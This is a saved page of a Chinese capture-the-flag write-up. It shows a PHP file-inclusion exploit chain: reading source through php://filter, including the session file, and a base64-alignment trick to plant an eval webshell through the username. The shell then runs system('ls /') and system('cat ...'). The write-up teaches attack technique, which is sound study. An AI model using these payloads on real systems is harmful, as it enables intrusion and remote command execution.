@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<!-- saved from url=(0044)https://xianzhi.aliyun.com/forum/topic/1576/ -->
+<html id="html" data-evernote-id="0" class="js-evernote-checked"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link id="baseCSS" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/reformat/css/base__newsprint.css" rel="stylesheet" class="newsprint" type="text/css"><style type="text/css" id="optionsCSS">#body { font-family: "PT Serif"; font-size: 16px; line-height: 1.5em; color: #1f0909; text-align: left; } #text { padding-top: 4.5em;padding-bottom: 9em;} #background { background-color: #f3f2ee; } .setTextColorAsBackgroundColor { background-color: #1f0909; } .setBackgroundColorAsTextColor { color: #f3f2ee; } .setBackgroundColor { background-color: #f3f2ee; } .setTextColor { color: #1f0909; } #box, .setBoxWidth { width: 36em; } a { color: #065588; } a:visited { color: #1f0909; } @media print { body.footnote_links__on_print a, body.footnote_links__on_print a:hover { color: #1f0909 !important; text-decoration: none !important; } } body.footnote_links__always a, body.footnote_links__always a:hover { color: #1f0909 !important; text-decoration: none !important; } img { border-color: #1f0909; } a img { border-color: #065588; } a:visited img { border-color: #1f0909; } h1 a, h2 a, a h1, a h2 { color: #1f0909; } h1, h2, h3, h4, h5, h6 { font-family: "PT Serif"; } pre { background-color: #f3f2ee; } pre, code { font-family: Inconsolata; } hr { border-color: #1f0909; } html.rtl #body #text { text-align: right !important; } h1, h2, h3, h4, h5, h6 { text-align: left; } html.rtl h1, html.rtl h2, html.rtl h3, html.rtl h4, html.rtl h5, html.rtl h6 { text-align: right !important; } #text div.separatorLine, #text section::before { background:      -o-linear-gradient(0, #f3f2ee 1%, #1f0909 50%, #f3f2ee 99%); background:    -moz-linear-gradient(0, #f3f2ee 1%, #1f0909 50%, #f3f2ee 99%); background: -webkit-linear-gradient(0, #f3f2ee 1%, #1f0909 50%, #f3f2ee 99%); } </style><link href="./css" rel="stylesheet" type="text/css"><link href="./css(1)" rel="stylesheet" type="text/css"><link id="clearly_highlighting_css" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/highlight/css/style.css" rel="stylesheet" type="text/css"><link id="clearly_highlighting_css_images" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/highlight/css/images.css" rel="stylesheet" type="text/css"></head><body id="body" class="footnote_links__on_print large_graphics__do_nothing js-evernote-checked" data-evernote-id="1"><div id="bodyContent" data-evernote-id="2" class="js-evernote-checked"><div id="box" data-evernote-id="3" class="js-evernote-checked"><div id="box_inner" data-evernote-id="4" class="js-evernote-checked"><div id="text" data-evernote-id="5" class="js-evernote-checked"><div id="pages" data-evernote-id="6" class="js-evernote-checked"><div class="page js-evernote-checked" id="page1" data-evernote-id="7"><div class="page_content js-evernote-checked" data-evernote-id="8"><div id="articleHeader" data-evernote-id="9" class="js-evernote-checked"><h1 id="articleHeader__title" data-evernote-id="10" class="js-evernote-checked">先知安全技术社区</h1><div id="articleHeader__separator" class="separator js-evernote-checked" data-evernote-id="11"><div class="separatorLine setTextColorAsBackgroundColor js-evernote-checked" data-evernote-id="12"></div></div></div>
+                
+                    
+                    <p data-evernote-id="13" class="js-evernote-checked">偶然在水群时看到了几道题，这是其中之一。</p>
+<h1 data-evernote-id="14" class="js-evernote-checked">Task</h1>
+
+<pre data-evernote-id="15" class="js-evernote-checked"><code data-evernote-id="16" class="js-evernote-checked">http://54.222.188.152:22589/</code></pre>
+<p data-evernote-id="17" class="js-evernote-checked"></p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="18"><img src="./4.png" data-evernote-id="19" class="js-evernote-checked" width="488" height="247"></div><p data-evernote-id="20" class="js-evernote-checked"></p>
+<h1 data-evernote-id="21" class="js-evernote-checked">Solution</h1>
+<h2 data-evernote-id="22" class="js-evernote-checked">php伪协议读取源码</h2>
+<p data-evernote-id="23" class="js-evernote-checked">点击login，发现链接变为：</p>
+
+<pre data-evernote-id="24" class="js-evernote-checked"><code data-evernote-id="25" class="js-evernote-checked">http://54.222.188.152:22589/index.php
+?action=login.php</code></pre>
+<p data-evernote-id="26" class="js-evernote-checked">推测文件包含。</p>
+<h3 data-evernote-id="27" class="js-evernote-checked">login.php</h3>
+<p data-evernote-id="28" class="js-evernote-checked">访问：</p>
+
+<pre data-evernote-id="29" class="js-evernote-checked"><code data-evernote-id="30" class="js-evernote-checked">http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-encode/resource=login.php</code></pre>
+<p data-evernote-id="31" class="js-evernote-checked">得到login.php源码：</p>
+<div data-evernote-id="32" class="js-evernote-checked"><pre data-evernote-id="33" class="js-evernote-checked">&lt;?php
+    require_once('config.php');
+    session_start();
+    if($_SESSION['username']) {
+        header('Location: index.php');
+        exit;
+    }
+    if($_POST['username'] &amp;&amp; $_POST['password']) {
+        $username = $_POST['username'];
+        $password = md5($_POST['password']);
+
+        $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);
+
+        if ($mysqli-&gt;connect_errno) {
+            die("could not connect to the database:\n" . $mysqli-&gt;connect_error);
+        }
+        $sql = "select password from user where username=?";
+        $stmt = $mysqli-&gt;prepare($sql);
+        $stmt-&gt;bind_param("s", $username);
+        $stmt-&gt;bind_result($res_password);
+        $stmt-&gt;execute();
+
+        $stmt-&gt;fetch();
+        if ($res_password == $password) {
+            $_SESSION['username'] = base64_encode($username);
+            header("location:index.php");
+        } else {
+            die("Invalid user name or password");
+        }
+        $stmt-&gt;close();
+        $mysqli-&gt;close();
+    }
+    else {
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+   &lt;title&gt;Login&lt;/title&gt;
+   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;
+   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;
+   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container" style="margin-top:100px"&gt;  
+        &lt;form action="login.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;
+            &lt;h3&gt;Login&lt;/h3&gt;
+            &lt;label&gt;Username:&lt;/label&gt;
+            &lt;input type="text" name="username" style="height:30px"class="span3"/&gt;
+            &lt;label&gt;Password:&lt;/label&gt;
+            &lt;input type="password" name="password" style="height:30px" class="span3"&gt;
+
+            &lt;button type="submit" class="btn btn-primary"&gt;LOGIN&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+    }
+?&gt;
+</pre></div>
+<h3 data-evernote-id="34" class="js-evernote-checked">register.php</h3>
+<p data-evernote-id="35" class="js-evernote-checked">访问：</p>
+
+<pre data-evernote-id="36" class="js-evernote-checked"><code data-evernote-id="37" class="js-evernote-checked">http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-encode/resource=register.php</code></pre>
+<p data-evernote-id="38" class="js-evernote-checked">register.php:</p>
+<div data-evernote-id="39" class="js-evernote-checked"><pre data-evernote-id="40" class="js-evernote-checked">&lt;?php
+
+if ($_POST['username'] &amp;&amp; $_POST['password']) {
+    require_once('config.php');
+
+    $username = $_POST['username'];
+    $password = md5($_POST['password']);
+
+    $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);
+    if ($mysqli-&gt;connect_errno) {
+        die("could not connect to the database:\n" . $mysqli-&gt;connect_error);
+    }
+    $mysqli-&gt;set_charset("utf8");
+    $sql = "select * from user where username=?";
+    $stmt = $mysqli-&gt;prepare($sql);
+    $stmt-&gt;bind_param("s", $username);
+    $stmt-&gt;bind_result($res_id, $res_username, $res_password);
+    $stmt-&gt;execute();
+    $stmt-&gt;store_result();
+    $count = $stmt-&gt;num_rows();
+    if($count) {
+        die('User name Already Exists');
+    } else {
+        $sql = "insert into user(username, password) values(?,?)";
+        $stmt = $mysqli-&gt;prepare($sql);
+        $stmt-&gt;bind_param("ss", $username, $password);
+        $stmt-&gt;execute();
+        echo 'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;';
+    }
+    $stmt-&gt;close();
+    $mysqli-&gt;close();
+} else {
+
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+   &lt;title&gt;Login&lt;/title&gt;
+   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;
+   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;
+   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container" style="margin-top:100px"&gt;  
+        &lt;form action="register.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;
+            &lt;h3&gt;Register&lt;/h3&gt;
+            &lt;label&gt;Username:&lt;/label&gt;
+            &lt;input type="text" name="username" style="height:30px"class="span3"/&gt;
+            &lt;label&gt;Password:&lt;/label&gt;
+            &lt;input type="password" name="password" style="height:30px" class="span3"&gt;
+
+            &lt;button type="submit" class="btn btn-primary"&gt;REGISTER&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+    }
+?&gt;
+</pre></div>
+<h3 data-evernote-id="41" class="js-evernote-checked">config.php</h3>
+<p data-evernote-id="42" class="js-evernote-checked">访问：</p>
+
+<pre data-evernote-id="43" class="js-evernote-checked"><code data-evernote-id="44" class="js-evernote-checked">http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-encode/resource=config.php</code></pre>
+<p data-evernote-id="45" class="js-evernote-checked">config.php:</p>
+
+<pre data-evernote-id="46" class="js-evernote-checked"><code data-evernote-id="47" class="js-evernote-checked">&lt;?php
+$dbhost = 'localhost';
+$dbuser = 'web';
+$dbpass = 'webpass123';
+$dbname = 'web';
+ ?&gt;</code></pre>
+<h3 data-evernote-id="48" class="js-evernote-checked">index.php</h3>
+<p data-evernote-id="49" class="js-evernote-checked">index.php源码：</p>
+<div data-evernote-id="50" class="js-evernote-checked"><pre data-evernote-id="51" class="js-evernote-checked">&lt;?php
+error_reporting(0);
+session_start();
+if (isset($_GET['action'])) {
+    include $_GET['action'];
+    exit();
+} else {
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;link href="css/bootstrap.css" rel="stylesheet" media="screen"&gt;
+    &lt;link href="css/main.css" rel="stylesheet" media="screen"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class="container"&gt;
+    &lt;div class="form-signin"&gt;
+&lt;?php if (isset($_SESSION['username'])) { ?&gt;
+&lt;?php echo "&lt;div class=\"alert alert-success\"&gt;You have been &lt;strong&gt;successfully logged in&lt;/strong&gt;.&lt;/div&gt;
+&lt;a href=\"index.php?action=logout.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Logout&lt;/a&gt;";}else{ ?&gt;
+&lt;?php echo "&lt;div class=\"alert alert-warning\"&gt;Please Login.&lt;/div&gt;
+&lt;a href=\"index.php?action=login.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Login&lt;/a&gt;
+&lt;a href=\"index.php?action=register.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Register&lt;/a&gt;";
+        } ?&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+
+}
+?&gt;
+</pre></div>
+<h2 data-evernote-id="52" class="js-evernote-checked">代码审计</h2>
+<h3 data-evernote-id="53" class="js-evernote-checked">SQL注入？</h3>
+<p data-evernote-id="54" class="js-evernote-checked">往往注册与登陆操作中会有与数据库交互的地方，这也是sql注入的常见引发点。</p>
+<p data-evernote-id="55" class="js-evernote-checked">看一下register.php，这里仅截取部分代码：</p>
+<div data-evernote-id="56" class="js-evernote-checked"><pre data-evernote-id="57" class="js-evernote-checked"># register.php
+
+$mysqli-&gt;set_charset("utf8");
+$sql = "select * from user where username=?";
+$stmt = $mysqli-&gt;prepare($sql);
+$stmt-&gt;bind_param("s", $username);
+$stmt-&gt;bind_result($res_id, $res_username, $res_password);
+$stmt-&gt;execute();
+$stmt-&gt;store_result();
+</pre></div>
+<p data-evernote-id="58" class="js-evernote-checked">再看一下login.php：</p>
+<div data-evernote-id="59" class="js-evernote-checked"><pre data-evernote-id="60" class="js-evernote-checked"># login.php
+
+$sql = "select password from user where username=?";
+$stmt = $mysqli-&gt;prepare($sql);
+$stmt-&gt;bind_param("s", $username);
+$stmt-&gt;bind_result($res_password);
+$stmt-&gt;execute();
+$stmt-&gt;fetch();
+</pre></div>
+<p data-evernote-id="61" class="js-evernote-checked">这里都使用了PHP的PDO处理，因此这里存在sql注入的可能性很小。</p>
+<h3 data-evernote-id="62" class="js-evernote-checked">Session</h3>
+<p data-evernote-id="63" class="js-evernote-checked">接着再看看，有哪些参数是可控的。</p>
+<p data-evernote-id="64" class="js-evernote-checked">在login.php中：</p>
+<div data-evernote-id="65" class="js-evernote-checked"><pre data-evernote-id="66" class="js-evernote-checked"># 第3行
+session_start();
+if($_SESSION['username']) {
+    header('Location: index.php');
+    exit;
+}
+# 第8行
+if($_POST['username'] &amp;&amp; $_POST['password']) {
+    $username = $_POST['username'];
+
+# 第20行
+    $stmt-&gt;bind_result($res_password);
+# 第24行
+    if ($res_password == $password) {
+        $_SESSION['username'] = base64_encode($username);
+        header("location:index.php");
+</pre></div>
+<p data-evernote-id="67" class="js-evernote-checked">这里使用了session来保存用户会话，<a href="http://php.net/manual/zh/session.examples.basic.php" target="_blank" data-evernote-id="68" class="js-evernote-checked">php手册</a>中是这样描述的：</p>
+<ol data-evernote-id="69" class="js-evernote-checked">
+<li data-evernote-id="70" class="js-evernote-checked">PHP 会将会话中的数据设置到 <code data-evernote-id="71" class="js-evernote-checked">$_SESSION</code> 变量中。</li>
+<li data-evernote-id="72" class="js-evernote-checked">当 PHP 停止的时候，它会自动读取 <code data-evernote-id="73" class="js-evernote-checked">$_SESSION</code> 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>
+<li data-evernote-id="74" class="js-evernote-checked">对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>
+</ol>
+<p data-evernote-id="75" class="js-evernote-checked">考虑到变量<code data-evernote-id="76" class="js-evernote-checked">$username</code>是我们可控的，并且被设置到了<code data-evernote-id="77" class="js-evernote-checked">$_SESSION</code>中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。关于session包含的相关知识，可以见这篇文章<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank" data-evernote-id="78" class="js-evernote-checked">chybeta:PHP文件包含</a></p>
+<p data-evernote-id="79" class="js-evernote-checked">要包含session文件，需要知道文件的路径。先注册一个用户，比如chybeta。等登陆成功后。记录下cookie中的PHPSESSID的值，这里为udu8pr09fjvabtoip8icgurt85</p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="80"><img src="./7.png" data-evernote-id="81" class="js-evernote-checked" width="576" height="105"></div><p data-evernote-id="82" class="js-evernote-checked"></p>
+<p data-evernote-id="83" class="js-evernote-checked">访问：</p>
+
+<pre data-evernote-id="84" class="js-evernote-checked"><code data-evernote-id="85" class="js-evernote-checked">http://54.222.188.152:22589/index.php?action=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85</code></pre>
+<p data-evernote-id="86" class="js-evernote-checked"></p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="87"><img src="./6.png" data-evernote-id="88" class="js-evernote-checked" width="576" height="162"></div><p data-evernote-id="89" class="js-evernote-checked"></p>
+<p data-evernote-id="90" class="js-evernote-checked">这个<code data-evernote-id="91" class="js-evernote-checked">/var/lib/php5/</code>的session文件路径是测试出来的，常见的也就如<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank" data-evernote-id="92" class="js-evernote-checked">chybeta:PHP文件包含</a>中所述的几种。</p>
+<h3 data-evernote-id="93" class="js-evernote-checked">base64_encode</h3>
+<p data-evernote-id="94" class="js-evernote-checked">能包含，并且控制session文件，但要写入可用的payload，还需要绕过：</p>
+
+<pre data-evernote-id="95" class="js-evernote-checked"><code data-evernote-id="96" class="js-evernote-checked">$_SESSION['username'] = base64_encode($username);</code></pre>
+<p data-evernote-id="97" class="js-evernote-checked">如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，势必导致乱码。</p>
+<p data-evernote-id="98" class="js-evernote-checked">考虑一下base64的编码过程。比如编码abc。</p>
+
+<pre data-evernote-id="99" class="js-evernote-checked"><code data-evernote-id="100" class="js-evernote-checked">未编码: abc
+转成ascii码： 97 98 99
+转成对应二进制（三组，每组8位）： 01100001 01100010 01100011
+重分组（四组，每组6位）： 011000 010110 001001 100011
+每组高位补零，变为每组8位：00011000 00010110 00001001 00100011
+每组对应转为十进制： 24 22 9 35
+查表得： Y W J j</code></pre>
+<p data-evernote-id="101" class="js-evernote-checked">考虑一下session的前缀：<code data-evernote-id="102" class="js-evernote-checked">username|s:12:"</code>，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。</p>
+<p data-evernote-id="103" class="js-evernote-checked">由于16个字符，恰好满足一下条件：</p>
+
+<pre data-evernote-id="104" class="js-evernote-checked"><code data-evernote-id="105" class="js-evernote-checked">16个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0</code></pre>
+<p data-evernote-id="106" class="js-evernote-checked">也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</p>
+<h2 data-evernote-id="107" class="js-evernote-checked">Get Flag</h2>
+<p data-evernote-id="108" class="js-evernote-checked">注册一个账号，比如：</p>
+
+<pre data-evernote-id="109" class="js-evernote-checked"><code data-evernote-id="110" class="js-evernote-checked">chybetachybetachybetachybetachybetachybetachybetachybetachybeta&lt;?php eval($_GET['atebyhc']) ?&gt;</code></pre>
+<p data-evernote-id="111" class="js-evernote-checked">其base64加密后的长度为128，大于100。<br>
+<img src="./8.png" data-evernote-id="112" class="js-evernote-checked" width="1252" height="146"></p>
+
+<pre data-evernote-id="113" class="js-evernote-checked"><code data-evernote-id="114" class="js-evernote-checked">http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85
+&amp;atebyhc=phpinfo();</code></pre>
+<p data-evernote-id="115" class="js-evernote-checked"></p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="116"><img src="./9.png" data-evernote-id="117" class="js-evernote-checked" width="576" height="126"></div>
+成功getshell。<p data-evernote-id="118" class="js-evernote-checked"></p>
+<p data-evernote-id="119" class="js-evernote-checked">访问：</p>
+
+<pre data-evernote-id="120" class="js-evernote-checked"><code data-evernote-id="121" class="js-evernote-checked">http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system('ls /');</code></pre>
+<p data-evernote-id="122" class="js-evernote-checked"></p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="123"><img src="./10.png" data-evernote-id="124" class="js-evernote-checked" width="576" height="171"></div><p data-evernote-id="125" class="js-evernote-checked"></p>
+<p data-evernote-id="126" class="js-evernote-checked">访问:</p>
+
+<pre data-evernote-id="127" class="js-evernote-checked"><code data-evernote-id="128" class="js-evernote-checked">http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system('cat /fffflllllaaaagggg.txt');</code></pre>
+<p data-evernote-id="129" class="js-evernote-checked"></p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="130"><img src="./11.png" data-evernote-id="131" class="js-evernote-checked" width="576" height="76"></div><p data-evernote-id="132" class="js-evernote-checked"></p>
+<h1 data-evernote-id="133" class="js-evernote-checked">小结</h1>
+<p data-evernote-id="134" class="js-evernote-checked">考了几个知识点：</p>
+<ol data-evernote-id="135" class="js-evernote-checked">
+<li data-evernote-id="136" class="js-evernote-checked">php文件包含：伪协议利用</li>
+<li data-evernote-id="137" class="js-evernote-checked">php文件包含：包含session文件</li>
+<li data-evernote-id="138" class="js-evernote-checked">php-session知识及序列化格式</li>
+<li data-evernote-id="139" class="js-evernote-checked">base64的基本原理</li>
+</ol>
+                    
+                
+            </div></div></div><div id="footnotedLinks" class="separateSection js-evernote-checked" data-evernote-id="140"><div id="footnotedLinks__separator" class="separator js-evernote-checked" data-evernote-id="141"><div class="separatorLine setTextColorAsBackgroundColor js-evernote-checked" data-evernote-id="142"></div></div><ol id="footnotedLinks__list" data-evernote-id="143" class="js-evernote-checked"></ol></div><div id="measure__lineHeight" data-evernote-id="144" class="js-evernote-checked">Measure</div><div id="measure__fontSize" data-evernote-id="145" class="js-evernote-checked">Measure</div></div></div></div><div id="background" data-evernote-id="146" class="js-evernote-checked"></div></div><link rel="stylesheet" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/reformat/css/style.css" type="text/css"><link rel="stylesheet" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/reformat/css/additional.css"><div id="loading" data-evernote-id="147" class="js-evernote-checked"></div></body></html>
